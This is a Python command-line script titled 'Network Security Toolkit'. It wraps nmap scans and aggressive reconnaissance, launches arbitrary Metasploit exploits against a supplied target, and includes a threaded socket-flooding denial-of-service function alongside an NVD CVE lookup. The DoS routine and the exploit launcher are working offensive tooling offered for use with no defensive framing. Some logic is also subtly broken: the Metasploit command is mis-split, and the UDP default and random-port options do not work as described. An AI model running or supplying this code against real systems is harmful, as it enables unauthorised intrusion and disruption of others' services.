import argparse
import requests
import subprocess
import sys
import time
import logging
import threading
import configparser
import random
import string
import socket

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def scan_with_nmap(target, use_udp):
    scan_type = "-sU" if use_udp else "-sT"
    nmap_cmd = f"sudo nmap -Pn {scan_type} -sC -sV {target}"

    try:
        output = subprocess.check_output(nmap_cmd.split())
        logger.info(output.decode())
    except subprocess.CalledProcessError as e:
        logger.error(f"Error executing Nmap scan: {e}")

def run_metasploit_exploit(target, exploit):
    metasploit_cmd = f"sudo msfconsole -x 'use {exploit}; set RHOST {target}; run;'"

    try:
        output = subprocess.check_output(metasploit_cmd.split())
        logger.info(output.decode())
    except subprocess.CalledProcessError as e:
        logger.error(f"Error executing Metasploit exploit: {e}")

def gather_network_info(target):
    info_cmd = f"sudo nmap -A {target}"

    try:
        output = subprocess.check_output(info_cmd.split())
        logger.info(output.decode())
    except subprocess.CalledProcessError as e:
        logger.error(f"Error gathering network information: {e}")

def generate_random_payload(size):
    """Generate a random payload of given size."""
    payload = ''.join(random.choices(string.ascii_letters + string.digits, k=size))
    return payload.encode()

def perform_dos_attack(target, packets, interval, port, use_udp):
    """Perform a Denial-of-Service (DoS) attack on the target."""
    protocol = socket.SOCK_DGRAM if use_udp else socket.SOCK_STREAM

    try:
        logger.info(f"Starting DoS attack on {target}...")
        for _ in range(packets):
            with socket.socket(socket.AF_INET, protocol) as sock:
                if use_udp:
                    sock.sendto(generate_random_payload(512), (target, port))
                else:
                    sock.connect((target, port))
            time.sleep(interval)
        logger.info("DoS attack completed.")
    except socket.error as e:
        logger.error(f"Socket error occurred during DoS attack: {e}")
    except Exception as e:
        logger.error(f"Error performing DoS attack: {e}")

def get_known_cves(target):
    api_url = f"https://services.nvd.nist.gov/rest/json/cves/1.0?keyword={target}"
    try:
        response = requests.get(api_url)
        data = response.json()

        if "result" in data:
            cves = data["result"].get("CVE_Items", [])

            if len(cves) > 0:
                logger.info(f"Found {len(cves)} known CVE(s) for {target}:")
                for cve in cves:
                    cve_id = cve["cve"]["CVE_data_meta"]["ID"]
                    logger.info("- " + cve_id)
            else:
                logger.info("No known CVEs found for the target.")
        else:
            logger.error("Error: Unable to retrieve CVE information.")
    except requests.exceptions.RequestException as e:
        logger.error("Error: Failed to connect to the NVD API.")

def perform_dos_attack_threaded(target, packets, interval, port, use_udp):
    dos_thread = threading.Thread(target=perform_dos_attack, args=(target, packets, interval, port, use_udp))
    dos_thread.start()

def get_known_cves_threaded(target):
    cves_thread = threading.Thread(target=get_known_cves, args=(target,))
    cves_thread.start()

def is_valid_ip_address(ip_address):
    """Check if the given string is a valid IP address."""
    parts = ip_address.split(".")
    if len(parts) != 4:
        return False
    for part in parts:
        try:
            num = int(part)
            if num < 0 or num > 255:
                return False
        except ValueError:
            return False
    return True

def load_configuration():
    """Load configuration from config.ini file."""
    config = configparser.ConfigParser()
    config.read("config.ini")

    defaults = config["Defaults"]
    interval = defaults.getfloat("interval", 0.1)
    udp = defaults.getboolean("udp", False)

    return interval, udp

def main():
    parser = argparse.ArgumentParser(description="Network Security Toolkit")
    parser.add_argument("choice", choices=["1", "2", "3", "4", "5", "6"], help="Select an option (1-6)")
    parser.add_argument("-t", "--target", help="Target IP or hostname")
    parser.add_argument("-e", "--exploit", help="Exploit name")
    parser.add_argument("-p", "--packets", type=int, help="Number of packets to send (for DoS attack)")
    parser.add_argument("-i", "--interval", type=float, help="Interval between packets in seconds (for DoS attack)")
    parser.add_argument("--port", type=int, default=0, help="Destination port for DoS attack (0 for random)")
    parser.add_argument("-u", "--udp", action="store_true", help="Use UDP instead of TCP for Nmap scan")
    args = parser.parse_args()

    if args.choice == "1":
        if not args.target:
            parser.error("Please provide the target IP or hostname.")
        scan_with_nmap(args.target, args.udp)
    elif args.choice == "2":
        if not args.target or not args.exploit:
            parser.error("Please provide both the target IP or hostname and the exploit name.")
        run_metasploit_exploit(args.target, args.exploit)
    elif args.choice == "3":
        if not args.target:
            parser.error("Please provide the target IP or hostname.")
        gather_network_info(args.target)
    elif args.choice == "4":
        if not args.target or not args.packets:
            parser.error("Please provide both the target IP or hostname and the number of packets.")
        interval, udp = load_configuration()
        if not args.interval:
            args.interval = interval
        perform_dos_attack_threaded(args.target, args.packets, args.interval, args.port, args.udp)
    elif args.choice == "5":
        if not args.target:
            parser.error("Please provide the target IP or hostname.")
        try:
            get_known_cves_threaded(args.target)
        except Exception as e:
            logger.error(f"Error retrieving known CVEs: {e}")
    elif args.choice == "6":
        print("Goodbye!")
        sys.exit(0)

if __name__ == "__main__":
    main()
